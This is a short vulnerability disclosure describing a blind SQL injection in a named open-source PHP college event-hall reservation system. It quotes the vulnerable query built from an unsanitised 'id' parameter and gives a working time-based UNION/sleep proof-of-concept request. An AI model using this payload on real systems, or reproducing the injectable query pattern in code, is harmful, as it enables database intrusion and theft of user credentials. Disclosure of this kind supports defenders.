# MAGESH-K21 / Online-College-Event-Hall-Reservation-System - Blind SQL Injection on logincheck.php via home.php

## **Credits**
> Joshua Lictan (https://github.com/skid-nochizplz/skid-nochizplz)<br/>

## Vendor Homepage:
> https://github.com/MAGESH-K21/Online-College-Event-Hall-Reservation-System/

## Affected Component
> /home.php
> /config/logincheck.php

## Code
#### home.php
```php
<?php include('config/logincheck.php');$id=$_GET['id'];?>
```
#### /config/logincheck.php
```php

    $id=$_GET['id'];
    $sql="SELECT * FROM tbl_user WHERE user_id='$id'";
    $res=mysqli_query($conn,$sql);
    if($res==True){
      while($row=mysqli_fetch_assoc($res)){
        $user_name=$row['user_name'];
        $user_dept=$row['user_dept'];
        $user_email=$row['user_email'];
        $user_password=$row['user_password'];
      }
    }
```

## Proof of Concept
**HTTP Request Example**
``` http request
GET /home.php?id=NoChizPlz'+union+select+sleep(5),1,1,1,1+%23 HTTP/1.1
Host: [REDACTED]
```

## Screenshot

![image](https://github.com/skid-nochizplz/skid-nochizplz/assets/60700937/e12c9931-b67c-4d05-af2b-772363f82d1c)
